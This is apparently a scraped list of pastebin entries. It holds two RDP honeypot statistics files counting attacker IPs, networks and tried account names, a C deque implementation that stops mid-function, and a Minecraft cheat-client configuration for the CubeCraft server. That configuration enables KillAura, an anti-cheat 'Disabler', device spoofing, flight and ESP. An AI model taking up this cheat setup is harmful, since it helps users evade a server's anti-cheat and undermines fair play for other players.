id,title,username,language,date,content
3wL6sGQm,2023-12-17_stats.json,rdp_snitch,JSON,Sunday 17th of December 2023 06:16:09 PM CDT,"{
  ""ip"": {
    ""103.178.235.43"": 644,
    ""212.70.149.146"": 12,
    ""194.165.17.21"": 8,
    ""103.76.139.213"": 8,
    ""80.66.76.92"": 4,
    ""198.235.24.106"": 6,
    ""87.251.75.64"": 2,
    ""157.119.249.52"": 4,
    ""87.251.75.145"": 4,
    ""147.78.47.51"": 4,
    ""2.133.78.52"": 2,
    ""194.165.16.10"": 4,
    ""139.144.116.60"": 2,
    ""185.170.144.113"": 30,
    ""67.133.192.80"": 2,
    ""185.170.144.3"": 2,
    ""185.190.24.101"": 2,
    ""4.232.72.212"": 2,
    ""87.251.75.120"": 4,
    ""222.252.27.66"": 4,
    ""198.235.24.100"": 6,
    ""112.15.95.174"": 2,
    ""36.139.61.15"": 2,
    ""62.204.41.240"": 8,
    ""81.19.135.47"": 6,
    ""196.201.68.112"": 2,
    ""80.94.95.238"": 8,
    ""167.248.133.36"": 2,
    ""165.154.51.243"": 2,
    ""194.165.16.37"": 4,
    ""198.235.24.227"": 6,
    ""143.42.74.76"": 100,
    ""62.233.50.179"": 2,
    ""162.142.125.222"": 2,
    ""110.86.3.66"": 2,
    ""198.235.24.171"": 6
  },
  ""asn"": {
    ""AS140810"": 644,
    ""AS204428"": 20,
    ""AS48721"": 16,
    ""AS135746"": 8,
    ""AS208091"": 14,
    ""AS396982"": 24,
    ""AS135944"": 4,
    ""AS209588"": 10,
    ""AS9198"": 2,
    ""AS63949"": 102,
    ""AS197414"": 32,
    ""AS209"": 2,
    ""AS211632"": 2,
    ""AS8075"": 2,
    ""AS45899"": 4,
    ""AS56041"": 4,
    ""AS59425"": 8,
    ""AS29571"": 2,
    ""AS398324"": 4,
    ""AS135377"": 2,
    ""AS57523"": 2,
    ""AS4134"": 2
  },
  ""isp"": {
    ""VPSTTT"": 644,
    ""SS-Net"": 20,
    ""Flyservers S.A."": 26,
    ""Cityline Networks Pvt Ltd"": 8,
    ""Xhost Internet Solutions LP"": 46,
    ""Google LLC"": 24,
    ""VinhNam Commercial informatics service corporation"": 4,
    ""JSC Kazakhtelecom"": 2,
    ""Akamai Technologies, Inc."": 102,
    ""CenturyLink"": 2,
    ""Internet Solutions & Innovations LTD."": 2,
    ""Microsoft Corporation"": 2,
    ""VietNam Post and Telecom Corporation"": 4,
    ""China Mobile Communications Corporation"": 4,
    ""Horizon LLC"": 8,
    ""Ftth-bng-ban RES"": 2,
    ""Censys, Inc."": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Chinanet"": 2
  },
  ""org"": {
    ""VPSTTT Technology Company Limited"": 644,
    ""4Media Ltd"": 12,
    ""Flyservers S.A"": 20,
    ""Cityline Networks Pvt Ltd"": 8,
    ""Xhost Internet Solutions"": 14,
    ""Palo Alto Networks, Inc"": 24,
    ""VINACIS"": 4,
    ""Kazakhtelecom Data Network Administration"": 2,
    ""Linode"": 102,
    ""Xhostis"": 32,
    ""CenturyLink, Inc"": 2,
    ""Tribeka Web Advisors S.A"": 2,
    ""Microsoft Azure Cloud (italynorth)"": 2,
    ""Hanoi Post and Telecom Company"": 4,
    ""China Mobile Communications Corporation"": 4,
    ""Horizon LLC"": 8,
    ""Alviva Holding Limited"": 6,
    ""Unknown"": 2,
    ""BtHoster LTD"": 8,
    ""Censys, Inc."": 2,
    ""Ucloud Information Technology"": 2,
    ""Sierra LLC"": 2,
    ""Censys Inc"": 2,
    ""Chinanet FJ"": 2
  },
  ""regionName"": {
    ""Ho Chi Minh"": 648,
    ""Plovdiv"": 12,
    ""Kaunas"": 16,
    ""Uttar Pradesh"": 8,
    ""England"": 4,
    ""California"": 24,
    ""North Holland"": 46,
    ""Almaty"": 2,
    ""North West"": 102,
    ""New Jersey"": 2,
    ""Mariehamns stad"": 2,
    ""Lombardy"": 2,
    ""Hanoi"": 4,
    ""Zhejiang"": 4,
    ""Moscow"": 10,
    ""Sverdlovsk Oblast"": 6,
    ""Abidjan"": 2,
    ""Budapest"": 8,
    ""Michigan"": 4,
    ""Bangkok"": 2,
    ""Fujian"": 2
  },
  ""country"": {
    ""Vietnam"": 652,
    ""Bulgaria"": 12,
    ""Lithuania"": 16,
    ""India"": 8,
    ""United Kingdom"": 4,
    ""United States"": 30,
    ""The Netherlands"": 46,
    ""Kazakhstan"": 2,
    ""Singapore"": 102,
    ""Aland Islands"": 2,
    ""Italy"": 2,
    ""China"": 6,
    ""Russia"": 16,
    ""Ivory Coast"": 2,
    ""Hungary"": 8,
    ""Thailand"": 2
  },
  ""account"": {
    ""hello"": 680,
    ""Domain"": 52,
    ""Administr"": 32,
    ""yjSKCiLEI"": 2,
    ""HXDhOU"": 2,
    ""YLZOdg"": 2,
    ""(empty)"": 8,
    ""Test"": 12,
    ""iPFAFsKtW"": 2,
    ""vXNtnj"": 2,
    ""avOZGi"": 2,
    ""Administrator"": 52,
    ""ZFvmrBMYo"": 2,
    ""yKCdLs"": 2,
    ""AsBGMg"": 2,
    ""Admin"": 50,
    ""RrGOhtwFZ"": 2,
    ""gfSbKj"": 2,
    ""RhxIDa"": 2
  },
  ""keyboard"": {
    ""Unknown"": 910
  },
  ""client_build"": {
    ""Unknown"": 910
  },
  ""client_name"": {
    ""Unknown"": 910
  },
  ""ip_type"": {
    ""Unknown"": 762,
    ""proxy"": 12,
    ""hosting"": 130,
    ""mobile"": 6
  }
}"
hnPyvMa0,2023-12-17_stats.json,rdp_snitch,JSON,Sunday 17th of December 2023 06:15:07 PM CDT,"{
  ""ip"": {
    ""103.178.235.43"": 322,
    ""212.70.149.146"": 6,
    ""194.165.17.21"": 4,
    ""103.76.139.213"": 4,
    ""80.66.76.92"": 2,
    ""198.235.24.106"": 3,
    ""87.251.75.64"": 1,
    ""157.119.249.52"": 2,
    ""87.251.75.145"": 2,
    ""147.78.47.51"": 2,
    ""2.133.78.52"": 1,
    ""194.165.16.10"": 2,
    ""139.144.116.60"": 1,
    ""185.170.144.113"": 15,
    ""67.133.192.80"": 1,
    ""185.170.144.3"": 1,
    ""185.190.24.101"": 1,
    ""4.232.72.212"": 1,
    ""87.251.75.120"": 2,
    ""222.252.27.66"": 2,
    ""198.235.24.100"": 3,
    ""112.15.95.174"": 1,
    ""36.139.61.15"": 1,
    ""62.204.41.240"": 4,
    ""81.19.135.47"": 3,
    ""196.201.68.112"": 1,
    ""80.94.95.238"": 4,
    ""167.248.133.36"": 1,
    ""165.154.51.243"": 1,
    ""194.165.16.37"": 2,
    ""198.235.24.227"": 3,
    ""143.42.74.76"": 50,
    ""62.233.50.179"": 1,
    ""162.142.125.222"": 1,
    ""110.86.3.66"": 1,
    ""198.235.24.171"": 3
  },
  ""asn"": {
    ""AS140810"": 322,
    ""AS204428"": 10,
    ""AS48721"": 8,
    ""AS135746"": 4,
    ""AS208091"": 7,
    ""AS396982"": 12,
    ""AS135944"": 2,
    ""AS209588"": 5,
    ""AS9198"": 1,
    ""AS63949"": 51,
    ""AS197414"": 16,
    ""AS209"": 1,
    ""AS211632"": 1,
    ""AS8075"": 1,
    ""AS45899"": 2,
    ""AS56041"": 2,
    ""AS59425"": 4,
    ""AS29571"": 1,
    ""AS398324"": 2,
    ""AS135377"": 1,
    ""AS57523"": 1,
    ""AS4134"": 1
  },
  ""isp"": {
    ""VPSTTT"": 322,
    ""SS-Net"": 10,
    ""Flyservers S.A."": 13,
    ""Cityline Networks Pvt Ltd"": 4,
    ""Xhost Internet Solutions LP"": 23,
    ""Google LLC"": 12,
    ""VinhNam Commercial informatics service corporation"": 2,
    ""JSC Kazakhtelecom"": 1,
    ""Akamai Technologies, Inc."": 51,
    ""CenturyLink"": 1,
    ""Internet Solutions & Innovations LTD."": 1,
    ""Microsoft Corporation"": 1,
    ""VietNam Post and Telecom Corporation"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Horizon LLC"": 4,
    ""Ftth-bng-ban RES"": 1,
    ""Censys, Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Chinanet"": 1
  },
  ""org"": {
    ""VPSTTT Technology Company Limited"": 322,
    ""4Media Ltd"": 6,
    ""Flyservers S.A"": 10,
    ""Cityline Networks Pvt Ltd"": 4,
    ""Xhost Internet Solutions"": 7,
    ""Palo Alto Networks, Inc"": 12,
    ""VINACIS"": 2,
    ""Kazakhtelecom Data Network Administration"": 1,
    ""Linode"": 51,
    ""Xhostis"": 16,
    ""CenturyLink, Inc"": 1,
    ""Tribeka Web Advisors S.A"": 1,
    ""Microsoft Azure Cloud (italynorth)"": 1,
    ""Hanoi Post and Telecom Company"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Horizon LLC"": 4,
    ""Alviva Holding Limited"": 3,
    ""Unknown"": 1,
    ""BtHoster LTD"": 4,
    ""Censys, Inc."": 1,
    ""Ucloud Information Technology"": 1,
    ""Sierra LLC"": 1,
    ""Censys Inc"": 1,
    ""Chinanet FJ"": 1
  },
  ""regionName"": {
    ""Ho Chi Minh"": 324,
    ""Plovdiv"": 6,
    ""Kaunas"": 8,
    ""Uttar Pradesh"": 4,
    ""England"": 2,
    ""California"": 12,
    ""North Holland"": 23,
    ""Almaty"": 1,
    ""North West"": 51,
    ""New Jersey"": 1,
    ""Mariehamns stad"": 1,
    ""Lombardy"": 1,
    ""Hanoi"": 2,
    ""Zhejiang"": 2,
    ""Moscow"": 5,
    ""Sverdlovsk Oblast"": 3,
    ""Abidjan"": 1,
    ""Budapest"": 4,
    ""Michigan"": 2,
    ""Bangkok"": 1,
    ""Fujian"": 1
  },
  ""country"": {
    ""Vietnam"": 326,
    ""Bulgaria"": 6,
    ""Lithuania"": 8,
    ""India"": 4,
    ""United Kingdom"": 2,
    ""United States"": 15,
    ""The Netherlands"": 23,
    ""Kazakhstan"": 1,
    ""Singapore"": 51,
    ""Aland Islands"": 1,
    ""Italy"": 1,
    ""China"": 3,
    ""Russia"": 8,
    ""Ivory Coast"": 1,
    ""Hungary"": 4,
    ""Thailand"": 1
  },
  ""account"": {
    ""hello"": 340,
    ""Domain"": 26,
    ""Administr"": 16,
    ""yjSKCiLEI"": 1,
    ""HXDhOU"": 1,
    ""YLZOdg"": 1,
    ""(empty)"": 4,
    ""Test"": 6,
    ""iPFAFsKtW"": 1,
    ""vXNtnj"": 1,
    ""avOZGi"": 1,
    ""Administrator"": 26,
    ""ZFvmrBMYo"": 1,
    ""yKCdLs"": 1,
    ""AsBGMg"": 1,
    ""Admin"": 25,
    ""RrGOhtwFZ"": 1,
    ""gfSbKj"": 1,
    ""RhxIDa"": 1
  },
  ""keyboard"": {
    ""Unknown"": 455
  },
  ""client_build"": {
    ""Unknown"": 455
  },
  ""client_name"": {
    ""Unknown"": 455
  },
  ""ip_type"": {
    ""Unknown"": 381,
    ""proxy"": 6,
    ""hosting"": 65,
    ""mobile"": 3
  }
}"
0Lz4RF6b,CubeCraft Vector Client Config,darraghd493,JSON,Sunday 17th of December 2023 05:28:27 PM CDT,"{
    ""Animation"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Block A"": true,
            ""Block B"": false,
            ""Block C"": false,
            ""Fake Block"": true,
            ""Mode"": 0,
            ""Motion"": 0.36955565214157104,
            ""Speed"": 17
        }
    },
    ""AnniSound"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""AntiBot"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Mode"": 0
        }
    },
    ""AntiImmobile"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""AntiLagback"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""AntiVoid"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Distance"": 3
        }
    },
    ""ArrayList"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Animation"": 1,
            ""Line"": 1,
            ""Lowercase"": false,
            ""Reverse Animation"": true,
            ""Reverse Colors"": false,
            ""Show suffix"": true,
            ""Speed"": 15
        }
    },
    ""AutoQueue"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""AutoSnowball"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Throw delay"": 300
        }
    },
    ""AutoSpellBook"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Threshold"": 7.0
        }
    },
    ""AutoVClip"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""BlockESP"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Fade"": true,
            ""Highlight Diamond"": true,
            ""Highlight Emerald"": true,
            ""Highlight Gold"": true,
            ""Highlight Iron"": true,
            ""Highlight Lapis"": true,
            ""Highlight RedStone"": true,
            ""Mode"": 0,
            ""Only can break"": true,
            ""Range"": 8.0,
            ""Thickness"": 1.0
        }
    },
    ""BoatFlight"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Speed"": 1.5,
            ""Vertical Speed"": 1.5
        }
    },
    ""Breaker"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Delay"": 200,
            ""Swing"": false
        }
    },
    ""Camera"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""CameraClip"": true,
            ""FullBright"": true,
            ""NoOverlay"": true
        }
    },
    ""ChatCleaner"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""ChatSuffix"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Mode"": 0
        }
    },
    ""ChestStealer"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Delay"": 100
        }
    },
    ""ClickFriend"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""ClickGui"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": true,
        ""settings"": null
    },
    ""CustomFov"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Fov"": 114.13217163085938
        }
    },
    ""Desync"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": {
            ""Max Packet"": 2,
            ""Max Ticks"": 30,
            ""Mode"": 1,
            ""Movement Only"": false,
            ""Server-side"": true
        }
    },
    ""DeviceSpoofer"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""DeviceModel"": 1,
            ""ModelType"": 0
        }
    },
    ""Disabler"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Clumsy delay"": 20,
            ""Mode"": 1
        }
    },
    ""ESP"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Mode"": 1,
            ""Teams"": false
        }
    },
    ""FastStop"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": null
    },
    ""Flight"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": {
            ""Boost value"": 1.5,
            ""Delay"": 4,
            ""Desync"": false,
            ""Desync delay"": 4,
            ""Down"": false,
            ""DownValue"": 0.0019687116146087646,
            ""Mode"": 0,
            ""Sneak Boost"": false,
            ""Speed"": 0.8233333826065063,
            ""Stop speed"": false,
            ""Temp timer"": 13.0,
            ""Timer"": 13.199999809265137
        }
    },
    ""Freecam"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": {
            ""Speed"": 1.5
        }
    },
    ""HUD"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Coordinate"": false,
            ""First letter"": false,
            ""KeyBinds"": false,
            ""Player Speed"": false,
            ""Timing"": 0,
            ""Watermark"": true,
            ""Watermark Mode"": 1
        }
    },
    ""HudEditor"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": null
    },
    ""InventoryManager"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Auto Drop"": true,
            ""Auto Equipment"": true,
            ""Auto Sort"": true,
            ""Delay"": 0,
            ""Drop axe"": true,
            ""Drop blocks"": false,
            ""Drop books"": false,
            ""Drop dirty cobblestones"": true,
            ""Mode"": 0,
            ""Only in Inventory"": false,
            ""Sort blocks"": true,
            ""Sort snowball"": false,
            ""Sort spellBook"": false
        }
    },
    ""JumpCircle"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Fade"": 2.0,
            ""Scale"": 1.5,
            ""Speed"": 1.0,
            ""Test"": 30.0
        }
    },
    ""KillAura"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": {
            ""Attack Range"": 7.003907680511475,
            ""Desync Delay"": 300,
            ""Max CPS"": 18.195556640625,
            ""Min CPS"": 16.91739845275879,
            ""Mode"": 2,
            ""Pause during Desync"": false,
            ""Priority"": 2,
            ""Raycast"": false,
            ""Render"": true,
            ""Render Mode"": 1,
            ""Rotation"": 2,
            ""Swap"": 1,
            ""Switch Delay"": 72,
            ""Target Range"": 7.003907680511475,
            ""Teams"": false,
            ""Thickness"": 6.0,
            ""Toggle"": true
        }
    },
    ""KillSound"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Sound"": 0
        }
    },
    ""KillSults"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Mode"": 3
        }
    },
    ""LongJump"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Boost"": 0.800000011920929,
            ""Mode"": 0,
            ""Motion"": 1.25,
            ""Place"": true,
            ""Speed"": 0.30000001192092896,
            ""Strafe"": false,
            ""Timer"": 20.0
        }
    },
    ""NameTags"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Foreground"": false,
            ""Teams"": false
        }
    },
    ""NexusBreaker"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": {
            ""Delay"": 500,
            ""Mode"": 0,
            ""Priority"": 1,
            ""Range"": 4.0
        }
    },
    ""NoClip"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": {
            ""Desync"": false,
            ""Flight"": false,
            ""Speed"": 0.699999988079071
        }
    },
    ""NoFall"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Distance"": 3.0,
            ""Height"": 0.10000000149011612,
            ""Mode"": 0
        }
    },
    ""NoSlowDown"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Mode"": 0
        }
    },
    ""Nuker"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": {
            ""Above check"": true,
            ""Limit"": 3,
            ""Mode"": 0,
            ""Range"": 4
        }
    },
    ""Phase"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Desync"": true
        }
    },
    ""Regen"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Amount"": 1.4500000476837158,
            ""Boost"": true,
            ""Continue delay"": 100,
            ""Delay"": 500,
            ""Mode"": 0,
            ""Priority"": 1,
            ""Range"": 6.0,
            ""Render"": true,
            ""Swing"": true,
            ""Toggle"": true
        }
    },
    ""Scaffold"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""hidden"": false,
        ""settings"": {
            ""Delay"": 3,
            ""Extend"": 3,
            ""LockY"": true,
            ""Mode"": 0,
            ""Priority"": 0,
            ""Render"": true,
            ""Render Counter"": true,
            ""Render block"": true,
            ""Rotation"": 1,
            ""Swap"": 0,
            ""Swing"": true,
            ""Timer"": 20.0,
            ""Tower"": 1,
            ""Under place"": true,
            ""Under place delay"": 2
        }
    },
    ""Sneak"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""Speed"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Boost Amount"": 0.20000000298023224,
            ""Boost Duration"": 0.30000001192092896,
            ""Damage Boost"": true,
            ""Desync"": true,
            ""Desync delay"": 16,
            ""Desync timer"": 30.0,
            ""Duration"": 1.0,
            ""Force sprint"": false,
            ""Mode"": 3,
            ""More boost"": false,
            ""Speed"": 0.6583707332611084,
            ""Timer"": 20.0
        }
    },
    ""SpeedMine"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Speed"": 70
        }
    },
    ""Spider"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Speed"": 0.30000001192092896
        }
    },
    ""Spinner"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Priority"": 0,
            ""Speed"": 30.0
        }
    },
    ""Sprint"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Strict"": true
        }
    },
    ""Stackable"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""TPAura"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Back"": true,
            ""CPS"": 2.0,
            ""Friends"": false,
            ""Priority"": 2,
            ""Randomize"": true,
            ""Range"": 15.0,
            ""Render"": true,
            ""Step"": 4.0,
            ""Team"": false,
            ""Thickness"": 6.0
        }
    },
    ""TargetStrafe"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Distance"": 1.6383777856826782
        }
    },
    ""Theme"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Background opacity"": 40.0,
            ""Blur Amount"": 12.0,
            ""Colored opacity"": 0.0,
            ""Fade Speed"": 12,
            ""Font"": 4,
            ""Primary"": [
                0.13110794126987457,
                0.5880445241928101,
                0.7591527700424194,
                1.0
            ],
            ""Quaternary"": [
                0.3960784375667572,
                0.7803921699523926,
                0.9686274528503418,
                0.0
            ],
            ""Secondary"": [
                0.08120296895503998,
                0.48839256167411804,
                0.9216803908348083,
                1.0
            ],
            ""Shadow Amount"": 100.0,
            ""Tertiary"": [
                0.396078497171402,
                0.6468979120254517,
                0.9686274528503418,
                1.0
            ],
            ""Theme"": 5
        }
    },
    ""TimeChanger"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Time"": 1
        }
    },
    ""Timer"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Timer"": 29.978609085083008
        }
    },
    ""ToggleSound"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": null
    },
    ""Velocity"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": true,
        ""hidden"": false,
        ""settings"": {
            ""Horizontal"": 0.0,
            ""Vertical"": 0.0
        }
    },
    ""WarmupTimer"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": null
    },
    ""Zoom"": {
        ""element"": {
            ""x"": 0.0,
            ""y"": 0.0
        },
        ""enabled"": false,
        ""hidden"": false,
        ""settings"": {
            ""Fov"": 20.0
        }
    }
}"
3ip5UDyy,Zadacha 2,vallec,C,Sunday 17th of December 2023 05:25:19 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#define STATIC_CAPACITY 100

// Static Deque

typedef struct {
    int deque[STATIC_CAPACITY];
    int front, rear;
    int size;
} StaticDeque;

void initStaticDeque(StaticDeque *deque) {
    deque->front = 0;
    deque->rear = -1;
    deque->size = 0;
}

int isStaticDequeEmpty(StaticDeque *deque) {
    return deque->size == 0;
}

int isStaticDequeFull(StaticDeque *deque) {
    return deque->size == STATIC_CAPACITY;
}

void addFrontStatic(StaticDeque *deque, int item) {
    if (isStaticDequeFull(deque)) {
        printf(""Static Deque is full.\n"");
        return;
    }
    deque->front = (deque->front - 1 + STATIC_CAPACITY) % STATIC_CAPACITY;
    deque->deque[deque->front] = item;
    deque->size++;
}

void addRearStatic(StaticDeque *deque, int item) {
    if (isStaticDequeFull(deque)) {
        printf(""Static Deque is full.\n"");
        return;
    }
    deque->rear = (deque->rear + 1) % STATIC_CAPACITY;
    deque->deque[deque->rear] = item;
    deque->size++;
}

int removeFrontStatic(StaticDeque *deque) {
    if (isStaticDequeEmpty(deque)) {
        printf(""Static Deque is empty.\n"");
        return -1;
    }
    int removed = deque->deque[deque->front];
    deque->front = (deque->front + 1) % STATIC_CAPACITY;
    deque->size--;
    return removed;
}

int removeRearStatic(StaticDeque *deque) {
    if (isStaticDequeEmpty(deque)) {
        printf(""Static Deque is empty.\n"");
        return -1;
    }
    int removed = deque->deque[deque->rear];
    deque->rear = (deque->rear - 1 + STATIC_CAPACITY) % STATIC_CAPACITY;
    deque->size--;
    return removed;
}

int getFrontStatic(StaticDeque *deque) {
    if (isStaticDequeEmpty(deque)) {
        printf(""Static Deque is empty.\n"");
        return -1;
    }
    return deque->deque[deque->front];
}

int getRearStatic(StaticDeque *deque) {
    if (isStaticDequeEmpty(deque)) {
        printf(""Static Deque is empty.\n"");
        return -1;
    }
    return deque->deque[deque->rear];
}

// Dynamic Deque

typedef struct Node {
    int data;
    struct Node* prev;
    struct Node* next;
} Node;

typedef struct {
    Node* front;
    Node* rear;
    int size;
} DynamicDeque;

Node* createNode(int item) {
    Node* newNode = (Node*)malloc(sizeof(Node));
    if (newNode == NULL) {
        printf(""Memory allocation failed.\n"");
        exit(EXIT_FAILURE);
    }
    newNode->data = item;
    newNode->prev = NULL;
    newNode->next = NULL;
    return newNode;
}

void initDynamicDeque(DynamicDeque *deque) {
    deque->front = NULL;
    deque->rear = NULL;
    deque->size = 0;
}

int isDynamicDequeEmpty(DynamicDeque *deque) {
    return deque->size == 0;
}

void addFrontDynamic(DynamicDeque *deque, int item) {
    Node* newNode = createNode(item);
    if (isDynamicDequeEmpty(deque)) {
        deque->front = deque->rear = newNode;
    } else {
        newNode->next = deque->front;
        deque->front->prev = newNode;
        deque->front = newNode;
    }
    deque->size++;
}

void addRearDynamic(DynamicDeque *deque, int item) {
    Node* newNode = createNode(item);
    if (isDynamicDequeEmpty(deque)) {
        deque->front = deque->rear = newNode;
    } else {
        newNode->prev = deque->rear;
        deque->rear->next = newNode;
        deque->rear = newNode;
    }
    deque->size++;
}

int removeFrontDynamic(DynamicDeque *deque) {
    if (isDynamicDequeEmpty(deque)) {
